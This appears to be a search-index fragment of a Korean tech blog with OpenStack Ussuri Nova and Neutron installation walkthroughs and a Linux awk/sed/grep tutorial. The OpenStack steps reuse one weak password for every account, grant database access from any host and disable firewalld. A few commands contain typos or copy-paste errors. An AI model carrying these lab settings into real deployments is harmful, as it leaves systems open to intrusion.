8515d3d046834de9b71b2938aae89898 | | service_name | placement | | service_type | placement | | url | http://controller:8778 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement admin http://controller:8778 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 63e47fcbfd7841dd95bb4d9d9a910ab5 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 8515d3d046834de9b71b2938aae89898 | | service_name | placement | | service_type | placement | | url | http://controller:8778 | +--------------+----------------------------------+    Nova 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database nova; $ MariaDB\u0026gt; grant all privileges on nova.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; create database nova_api; $ MariaDB\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; create database nova_cell0; $ MariaDB\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; create database placement; $ MariaDB\u0026gt; grant all privileges on placement.* to placement@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on placement.* to placement@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Nova 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-nova openstack-placement-api # nova 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/nova/nova.conf [DEFAULT] my_ip = 10.10.10.10 # my_ip는 반드시 IP로 적어주세요 ! state_path = /var/lib/nova enabled_apis = osapi_compute,metadata log_dir = /var/log/nova transport_url = rabbit://openstack:qwer1234@controller [api] auth_strategy = keystone [glance] api_servers = http://controller:9292 [vnc] enabled = true server_listen = $my_ip server_proxyclient_address = $my_ip [oslo_concurrency] lock_path = $state_path/tmp [api_database] connection = mysql+pymysql://nova:qwer1234@controller/nova_api [database] connection = mysql+pymysql://nova:qwer1234@controller/nova [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = nova password = qwer1234 [placement] auth_url = http://controller:5000 os_region_name = RegionOne auth_type = password project_domain_name = default user_domain_name = default project_name = service username = placement password = qwer1234 [wsgi] api_paste_config = /etc/nova/api-paste.ini $ controller\u0026gt; vi /etc/placement/placement.conf [DEFAULT] debug = false [api] auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = placement password = qwer1234 [placement_database] connection = mysql+pymysql://placement:qwer1234@controller/placement $ controller\u0026gt; vi /etc/httpd/conf.d/00-placement-api.conf \u0026lt;Directory /usr/bin\u0026gt; Require all granted \u0026lt;/Directory\u0026gt; # 15번 줄에 추가시킵니다. $ controller\u0026gt; su -s /bin/bash placement -c \u0026#34;placement-manage db sync\u0026#34; $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage api_db sync\u0026#34; $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34; $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage db sync\u0026#34; $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 create_cell --name cell1\u0026#34; # nova DB에 임포트 시킵니다. $ controller\u0026gt; semanage port -a -t http_port_t -p tcp 8778 $ controller\u0026gt; firewall-cmd --add-port={6080/tcp,6081/tcp,6082/tcp,8774/tcp,8775/tcp,8778/tcp} --permanent $ controller\u0026gt; firewall-cmd --reload $ controller\u0026gt; systemctl restart httpd $ controller\u0026gt; chown placement. /var/log/placement/placement-api.log $ controller\u0026gt; for service in api conductor scheduler novncproxy; do systemctl enable --now openstack-nova-$service done # Selinux 및 방화벽을 설정합니다. $ controller ~(keystone)\u0026gt; openstack compute service list +----+----------------+------------+----------+---------+-------+----------------------------+ | ID | Binary | Host | Zone | Status | State | Updated At | +----+----------------+------------+----------+---------+-------+----------------------------+ | 4 | nova-conductor | controller | internal | enabled | up | 2020-08-06T12:10:34.000000 | | 5 | nova-scheduler | controller | internal | enabled | up | 2020-08-06T12:10:38.000000 | +----+----------------+------------+----------+---------+-------+----------------------------+    Conpute node Nova 설치  nova 설차     Nova 서비스를 설치하기 전에 가상화를 위한 KVM + QEMU를 설치합니다. 이를 위해서는 Inter VT나 AMD-V가 필요합니다. ( CPU )  $ lsmod | grep kvm kvm_amd 110592 0 ccp 98304 1 kvm_amd kvm 786432 1 kvm_amd irqbypass 16384 1 kvm  $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install qemu-kvm libvirt virt-install libguestfs-tools # KVM 관련 모듈을 설치합니다. $ compute\u0026gt; systemctl enable --now libvirtd # libvirtd 서비스를 등록 및 시작합니다. $ compute\u0026gt; nmcli connection add type bridge autoconnect yes con-name br0 ifname br0 # br0의 가상 브릿지를 추가합니다. $ compute\u0026gt; nmcli connection modify br0 ipv4.addresses 10.10.10.30/24 ipv4.method manual # 가상 브리지의 IP를 추가합니다. ( compute node ip ) $ compute\u0026gt; nmcli connection modify br0 ipv4.gateway 10.10.10.10 # 가상 브리지의 GATEWAY를 등록합니다. $ compute\u0026gt; nmcli connection modify br0 ipv4.dns 8.8.8.8 # 가상 브릿지의 DNS를 등록합니다. $ compute\u0026gt; nmcli connection del ens34 # 본래의 네트워크 인터페이스를 삭제합니다. $ compute\u0026gt; nmcli connection add type bridge-slave autoconnect yes con-name ens34 ifname ens34 master br0 # 삭제한 네트워크 인터페이스 대신 브릿지를 매핑시키고 네트워크를 재시작 시킵니다. # 제 compute node의 내부대역 IP는 10.10.10.30/24 ens34입니다 햇갈리지 마세요 ! $ compute\u0026gt; init 6 $ compute\u0026gt; ipfconfig br0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.10.10.30 netmask 255.255.255.0 broadcast 10.10.10.255 inet6 fe80::6765:fe91:a94b:5529 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:80:33:15 txqueuelen 1000 (Ethernet) RX packets 465 bytes 56335 (55.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 348 bytes 66663 (65.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens34: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 ether 00:0c:29:80:33:15 txqueuelen 1000 (Ethernet) RX packets 471 bytes 63205 (61.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 450 bytes 75797 (74.0 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # 재시작후 네트워크 인터페이스를 확인하면 위와 같이 생성된 것을 확인할 수 있습니다.    $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-nova-compute # nova 및 관련 모듈을 설치합니다. $ controller\u0026gt; scp /etc/nova/nova.conf compute:/etc/nova/nova.conf # nova의 기본설정파일을 복사합니다. $ compute\u0026gt; vi /etc/nova/nova.conf [default] my_ip = 10.10.10.30 # my_ip는 반드시 IP로 적어주세요 ! [libvirt] virt_type = qemu [vnc] enabled = True server_listen = 0.0.0.0 server_proxyclient_address = $my_ip novncproxy_base_url = http://controller:6080/vnc_auto.html # nova관련 설정을 추가합니다. $ compute\u0026gt; firewall-cmd --add-port=5900-5999/tcp --permanent $ compute\u0026gt; firewall-cmd --reload $ compute\u0026gt; systemctl enable --now libvirtd $ compute\u0026gt; systemctl enable --now openstack-nova-compute    Nova 설치 확인  $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 discover_hosts\u0026#34; # DB에 compute의 대한 설정을 업데이트 합니다. $ controller\u0026gt; nova-manage cell_v2 discover_hosts --verbose # compute 노드가 검색이 안되었을 시 추가적으로 검색합니다. $ controller ~(keystone)\u0026gt; openstack compute service list +----+----------------+------------+----------+---------+-------+----------------------------+ | ID | Binary | Host | Zone | Status | State | Updated At | +----+----------------+------------+----------+---------+-------+----------------------------+ | 4 | nova-conductor | controller | internal | enabled | up | 2020-08-06T21:40:34.000000 | | 5 | nova-scheduler | controller | internal | enabled | up | 2020-08-06T21:40:37.000000 | | 8 | nova-compute | compute | nova | enabled | up | 2020-08-06T21:40:36.000000 | +----+----------------+------------+----------+---------+-------+----------------------------+   "}),a.add({id:207,href:'/docs/openstack/openstack/service/',title:"Service",content:"****   옵셔널 서비스  컴퓨트, 오브젝트 스토리지, 이미지, 인증, 네트워크, 블록 스토리지, 대시보드 서비스만으로도 오픈스택을 구축할 수 있음 텔레미터, 오케스트레이션, 데이터베이스 같은 서비스를 제대로 사용한다면 효율적인 클라우드 관리와 운영에 많은 도움을 많을 수 있음 메시징 서비스 Zaqar 공유 파일 시스템 서비스 Manila DNS 서비스 Designate  "}),a.add({id:208,href:'/docs/system/linux/linux04/',title:"Linux 문자열 처리",content:"Linux   Linux 문자열처리   Linux 문자열 처리는 입력 혹은 출력되는 문자열을 검색하거나, 혹은 데이터를 사용할 수 있도록 치환하는 명령어입니다.      awk   입력을 주어진 분리자(field seperator)로 분리하여 명령을 처리   주요 옵션     옵션 내용     F 문자열을 분리할 기준이 되는 분리문자 입력   v 파라미터 전달     내장함수     함수 설명     sub 지정한 문자열 치환   gsub 문자열 일괄 치환   index 주어진 무나열과 일치하는 문자의 인덱스를 반환   length 문자열의 길이를 반환   substr 시작위치에서 주어진 길이 만큼의 문자열을 반환   split 문자열을 분리하여 배열로 변환     사용예제  $ echo \u0026#34;i have a water.\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ sub(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, $4); print $4 }\u0026#39; wbter. $ echo \u0026#34;i have a water.\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ gsub(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;); print $1\u0026#34; \u0026#34;$2\u0026#34; \u0026#34;$3\u0026#34; \u0026#34;$4 }\u0026#39; i hbve b wbter. $ echo \u0026#34;i have a water.\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ print index($4, \u0026#34;a\u0026#34;) }\u0026#39; 2 $ echo \u0026#34;i have a water.\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ print length($4) }\u0026#39; 6 $ echo \u0026#34;1234567890\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ print substr($1, 3, 2) }\u0026#39; 34 $ echo \u0026#34;A/B/C/D/E/F/G\u0026#34; | awk -F \u0026#34; \u0026#34; \u0026#39;{ print split($1, array, \u0026#34;/\u0026#34;);print array[1];print array[3]; }\u0026#39; 7 A C $ echo | awk \u0026#39;{ printf(\u0026#34;%.1f + %.2f = %.3f\\n\u0026#34;, 40.1, 20.2, 40.1 + 20.2); }\u0026#39; 40.1 + 20.20 = 60.300 $ echo \u0026#34;Hello World\u0026#34; | awk \u0026#39;{ system(\u0026#34;echo \u0026#34;$1) }\u0026#39; Hello # system으로 추가 명령어 실행      cat    cat은 파일을 읽어서 표시하는 명령어 입니다.\n  파일 내용을 표준으로 출력하며, 인수에 복수의 파일을 지정하면 연결되어 출력됩니다.\n   주요 옵션     옵션 내용     -n 행번호를 표시   -b 공백을 제외하고 행번호를 표시        diff   diff는 서로 다른 두 개의 파일을 비교하여 다른 부분을 출력하는 명령어입니다.   주요 옵션     옵션 내용     -i 대소문자 무시        echo   문자열이나 변수를 출력하는 명령어입니다.   주요 옵션     옵션 내용     -n 개행을 하지 않음   -e 이스케이프문자를 허용   -E 이스케이프 문자를 허용하지 않음(기본 값)     사용예제   echo는 -e 옵션과 함께 사용하면 문자에 색을 입힐 수 있다.  참조 색상표1 참조 색상표2    RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # Color off $ echo -e ${RED}RED${NC} $ echo -e ${GREEN}GREEN${NC} vText=\u0026#34;abc\u0026#34; $ echo -e ${RED}${vText}${NC}     grep   grep은 지정한 문자열을 포함하고 있는 행을 검색하는 명령어입니다.   주요 옵션     옵션 내용     -i 대소문작 구분없이 검색   -v 해당 문자를 제외하고 검색   -n 검색한 문자의 행을 출력   -l 검색한 문자가 들어 있는 파일 이름을 출력        sed   sed란 텍스트 데이터를 패턴 매칭하여 처리하는 명령어로, 표준 입력이나 파일에서 텍스트를 입력받아 데이터를 처리합니다.   주요 옵션     옵션 내용     -f 처리할 명령을 저장한 파일로 지정     사용예제  $ cat sample.txt one two three four # o를 1로 변경  # s/이전문자/변경할문자/g 형식으로 입력  $ sed \u0026#39;s/o/1/g\u0026#39; sample.txt 1ne tw1 three f1ur # 탭(Tab)을 콤마(,)로 변경 $ sed \u0026#39;s/\\t/,/g\u0026#39; sample.txt     sort   sort는 텍스르틀 정렬하는 명령어입니다.   주요 옵션     옵션 내용     -k 정렬할 포지션을 지정   -t 필드를 구분하는 구분자, 기본 값은 공백과 탭   -r 역순으로 정렬     사용 예제  $ cat s a 1 d 4 a 2 c 2 a 3 b 3 c 4 # 원본 파일 내용  $ cat s | sort a 1 a 2 a 3 b 3 c 2 c 4 d 4 # 정렬  $ cat s | sort -k 2 a 1 a 2 c 2 a 3 b 3 c 4 d 4 # 2번째 데이터로 정렬   "}),a.add({id:209,href:'/docs/openstack/openstacktraining/openstack-ussuri-06/',title:"OpenStack Ussuri : Neutron",content:"OpenStack Ussuri : Neutron  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Neutron | | L2 Agent | | metadata agent | | Nova-API Compute | ----------------------- ----------------------- | L2 agent L3 agent | | metadata agent | | Neutron Server | -----------------------  OpenStack Ussuri : Neutron   Neutron는 OpenStack에서 네트워크 전반을 관리하는 서비스입니다. Neutron에 대한 자세한 설명은 Neutron를 참조해주세요.     Neutron service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 neutron +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 | | domain_id | default | | enabled | True | | id | 943fbb4370164c77ae6bf7fa455292f8 | | name | neutron | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user neutron admin $ controller ~(keystone)\u0026gt; openstack service create --name neutron --description \u0026#34;OpenStack Networking service\u0026#34; network +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Networking service | | enabled | True | | id | 055e5f6e38004338b0ae4a86e77932ae | | name | neutron | | type | network | +-------------+----------------------------------+ # neutron service 및 user을 생성합니다. $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network public http://controller:9696 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 350c666f597a41e59234b09f534aa72f | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 055e5f6e38004338b0ae4a86e77932ae | | service_name | neutron | | service_type | network | | url | http://controller:9696 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network internal http://controller:9696 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | b9cad959e1634ff797e27f00d50e9578 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 055e5f6e38004338b0ae4a86e77932ae | | service_name | neutron | | service_type | network | | url | http://controller:9696 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network admin http://controller:9696 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 72fc145deb1d4d508e3691b3bf77708e | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 055e5f6e38004338b0ae4a86e77932ae | | service_name | neutron | | service_type | network | | url | http://controller:9696 | +--------------+----------------------------------+ # neutron endpoint를 등록합니다.    neutron 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database neutron_ml2; $ MariaDB\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Neutron 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2 # neutron 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone state_path = /var/lib/neutron dhcp_agent_notification = True allow_overlapping_ips = True notify_nova_on_port_status_changes = True notify_nova_on_port_data_changes = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [database] connection = mysql+pymysql://neutron:qwer1234@controller/neutron_ml2 [nova] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = nova password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ controller\u0026gt; vi /etc/neutron/metadata_agent.ini [DEFAULT] nova_metadata_host = controller metadata_proxy_shared_secret = metadata_secret [cache] memcache_servers = controller:11211 $ controller\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = vxlan mechanism_drivers = openvswitch extension_drivers = port_security [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 $ controller\u0026gt; vi /etc/nova/nova.conf [default] ... ... use_neutron = True linuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver firewall_driver = nova.virt.firewall.NoopFirewallDriver [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = qwer1234 service_metadata_proxy = True metadata_proxy_shared_secret = metadata_secret $ controller\u0026gt; setsebool -P neutron_can_network on $ controller\u0026gt; setsebool -P daemons_enable_cluster_mode on $ controller\u0026gt; firewall-cmd --add-port=9696/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽 및 SELinux를 설정합니다. $ controller\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ controller\u0026gt; su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34; $ controller\u0026gt; systemctl enable --now neutron-server neutron-metadata-agent $ controller\u0026gt; systemctl restart openstack-nova-api # neutron DB를 임포트 시킨 후, 서비스를 등록 합니다.    neutron Network Node 설치  Neutron 설치  $ network\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch libibverbs # neutron 및 관련 모듈을 설치합니다. $ network\u0026gt; vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone state_path = /var/lib/neutron allow_overlapping_ips = True # RabbitMQ connection info transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [oslo_concurrency] lock_path = $state_path/lock $ network\u0026gt; vi /etc/neutron/dhcp_agent.ini [DEFAULT] interface_driver = openvswitch dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata = true $ network\u0026gt; vi /etc/neutron/metadata_agent.ini nova_metadata_host = controller metadata_proxy_shared_secret = metadata_secret [cache] memcache_servers = controller:11211 $ network\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = vxlan mechanism_drivers = openvswitch extension_drivers = port_security [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 # 끝에 추가합니다. $ network\u0026gt; vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [securitygroup] firewall_driver = openvswitch enable_security_group = true enable_ipset = true [agent] tunnel_types = vxlan prevent_arp_spoofing = True [ovs] local_ip = 10.10.10.20 bridge_mappings = physnet1:br-eth1 # 끝에 추가합니다. # 여기는 IP 를 반드시 적어야 해요 ! $ network\u0026gt; setsebool -P neutron_can_network on $ network\u0026gt; setsebool -P haproxy_connect_any on $ network\u0026gt; setsebool -P daemons_enable_cluster_mode on $ network\u0026gt; vi ovsofctl.te module ovsofctl 1.0; require { type neutron_t; type neutron_exec_t; type neutron_t; type dnsmasq_t; class file execute_no_trans; class capability { dac_override sys_rawio }; } #============= neutron_t ============== allow neutron_t self:capability { dac_override sys_rawio }; allow neutron_t neutron_exec_t:file execute_no_trans; #============= dnsmasq_t ============== allow dnsmasq_t self:capability dac_override; $ network\u0026gt; checkmodule -m -M -o ovsofctl.mod ovsofctl.te $ network\u0026gt; semodule_package --outfile ovsofctl.pp --module ovsofctl.mod $ network\u0026gt; semodule -i ovsofctl.pp $ network\u0026gt; systemctl disable --now firewalld # Selinux 및 방화벽을 설정합니다. $ network\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ network\u0026gt; systemctl enable --now openvswitch $ network\u0026gt; ovs-vsctl add-br br-int $ network\u0026gt; ovs-vsctl add-br br-eth1 $ network\u0026gt; ovs-vsctl add-port br-eth1 ens32 $ network\u0026gt; vi /etc/sysconfig/network-scripts/ifcfg-ens32 TYPE=Ethernet BOOTPROTO=static NAME=ens32 DEVICE=ens32 ONBOOT=yes $ network\u0026gt; vi /var/tmp/network_interface.sh #!/bin/bash ip link set up br-eth1 ip addr add 192.168.10.20/24 dev br-eth1 route add default gw 192.168.10.2 dev br-eth1 echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf $ network\u0026gt; chmod 755 /var/tmp/network_interface.sh $ network\u0026gt; vi /etc/systemd/system/set_interface.service [Unit] Description=Description for sample script goes here After=network.target [Service] Type=simple ExecStart=/var/tmp/network_interface.sh TimeoutStartSec=0 [Install] WantedBy=default.target $ systemctl enable set_interface $ init 6 # network 인터페이스 주의 !!! ( ex : ens32 ) $ network\u0026gt; for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl enable --now neutron-$service done # neutron 서비스를 등록합니다.   neutron compute Node 설치 Neutron 설치  $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch # neutron 및 관련 모듈을 설치합니다. $ compute\u0026gt; vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone state_path = /var/lib/neutron allow_overlapping_ips = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [oslo_concurrency] lock_path = $state_path/lock $ compute\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = vxlan mechanism_drivers = openvswitch extension_drivers = port_security [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 # 끝에 추가합니다. $ compute\u0026gt; vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [securitygroup] firewall_driver = openvswitch enable_security_group = true enable_ipset = true [agent] tunnel_types = vxlan prevent_arp_spoofing = True [ovs] local_ip = 10.10.10.20 # 끝에 추가합니다. # 여기는 반드시 IP로 적어야 해요 ! $ compute\u0026gt; vi /etc/nova/nova.conf [default] ... ... use_neutron = True linuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver firewall_driver = nova.virt.firewall.NoopFirewallDriver vif_plugging_is_fatal = True vif_plugging_timeout = 300 [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = qwer1234 service_metadata_proxy = True metadata_proxy_shared_secret = metadata_secret $ compute\u0026gt; setsebool -P neutron_can_network on $ compute\u0026gt; setsebool -P daemons_enable_cluster_mode on $ compute\u0026gt; vi ovsofctl.te module ovsofctl 1.0; require { type neutron_t; type neutron_exec_t; type neutron_t; type dnsmasq_t; class file execute_no_trans; class capability { dac_override sys_rawio }; } #============= neutron_t ============== allow neutron_t self:capability { dac_override sys_rawio }; allow neutron_t neutron_exec_t:file execute_no_trans; #============= dnsmasq_t ============== allow dnsmasq_t self:capability dac_override; $ network\u0026gt; checkmodule -m -M -o ovsofctl.mod ovsofctl.te $ network\u0026gt; semodule_package --outfile ovsofctl.pp --module ovsofctl.mod $ network\u0026gt; semodule -i ovsofctl.pp $ systemctl disable --now firewalld # Selinux 및 방화벽을 설정합니다. $ compute\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ compute\u0026gt; systemctl enable --now openvswitch $ compute\u0026gt; ovs-vsctl add-br br-int $ compute\u0026gt; systemctl restart openstack-nova-compute $ compute\u0026gt; systemctl enable --now neutron-openvswitch-agent # neutron 서비스를 등록합니다.    확인  $ controller ~(keystone)\u0026gt; openstack router create router +-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+ | Field | Value | +-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+ | admin_state_up | UP | | availability_zone_hints | | | availability_zones | | | created_at | 2020-08-07T00:05:40Z | | description | | | distributed | False | | external_gateway_info | null | | flavor_id | None | | ha | False | | id | f40d6130-a01c-486a-b088-3f27c9f57607 | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;d efault\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, re gion_name=\u0026#39;\u0026#39;, zone= | | name | router | | project_id | c76211c24a1f460ca67274d655d46725 | | revision_number | 1 | | routes | | | status | ACTIVE | | tags | | | updated_at | 2020-08-07T00:05:40Z | +-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+ $ controller ~(keystone)\u0026gt; openstack network create int --provider-network-type vxlan +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | admin_state_up | UP | | availability_zone_hints | | | availability_zones | | | created_at | 2020-08-07T00:05:58Z | | description | | | dns_domain | None | | id | 0edec63e-cc62-4e93-8962-d0ad2df27bc8 | | ipv4_address_scope | None | | ipv6_address_scope | None | | is_default | False | | is_vlan_transparent | None | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | mtu | 1450 | | name | int | | port_security_enabled | True | | project_id | c76211c24a1f460ca67274d655d46725 | | provider:network_type | vxlan | | provider:physical_network | None | | provider:segmentation_id | 1 | | qos_policy_id | None | | revision_number | 1 | | router:external | Internal | | segments | None | | shared | False | | status | ACTIVE | | subnets | | | tags | | | updated_at | 2020-08-07T00:05:58Z | +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack subnet create int-sub --network int \\ --subnet-range 1.1.1.0/24 --gateway 1.1.1.1 \\ --dns-nameserver 8.8.8.8 +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | allocation_pools | 1.1.1.2-1.1.1.254 | | cidr | 1.1.1.0/24 | | created_at | 2020-08-07T00:06:25Z | | description | | | dns_nameservers | 8.8.8.8 | | dns_publish_fixed_ip | None | | enable_dhcp | True | | gateway_ip | 1.1.1.1 | | host_routes | | | id | 800bc5af-45e9-4719-8969-4c154bc111d6 | | ip_version | 4 | | ipv6_address_mode | None | | ipv6_ra_mode | None | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | name | int-sub | | network_id | 